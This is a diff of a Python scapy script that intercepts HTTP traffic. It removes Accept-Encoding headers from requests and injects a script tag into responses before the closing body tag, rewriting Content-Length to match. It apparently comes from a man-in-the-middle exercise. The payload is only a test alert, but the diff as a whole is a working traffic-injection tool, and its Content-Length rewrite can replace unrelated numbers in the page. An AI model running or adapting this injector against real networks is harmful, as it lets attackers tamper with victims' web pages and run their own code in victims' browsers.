@@ -5,8 +5,15 @@ from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.dns import Raw
 import re
 
+AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
+replace_load = ""
+ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
+injection_code = "<script>alert('Test!'); </script>"
+
 def set_load(packet, load):
     packet[Raw].load = load
+    # For scapy to recalculate IP and Chksum for updated load, delete them
+    # Making the change from del, to *= None, does not affect the results
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
@@ -16,8 +23,6 @@ def set_load(packet, load):
     return packet
 
 def process_packet(packet):
-    AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
-    replace_load = ""
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
         load = scapy_packet[Raw].load
@@ -25,16 +30,20 @@ def process_packet(packet):
             if scapy_packet[TCP].dport == 80:
                 print("[+] HTTP Request:  ")
                 load = re.sub(
-                    AcceptEncodingRegex,
-                    replace_load,
+                    "Accept-Encoding:.*?\\r\\n",
+                    "",
                     load,
                     flags=re.IGNORECASE | re.MULTILINE
                 )
+
             elif scapy_packet[TCP].sport == 80:
                 print("[+] HTTP Response:  ")
-                load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
-                new_packet = set_load(scapy_packet, load)
-                packet.set_payload(str(new_packet))
+                load = load.replace("</body>", injection_code + "</body>")
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                if content_length_search:
+                    content_length = content_length_search.group(1)
+                    new_content_length = int(content_length) + len(injection_code)
+                    load = load.replace(content_length, str(new_content_length))
 
             if load != scapy_packet[Raw].load:
                 new_packet = set_load(scapy_packet, load)
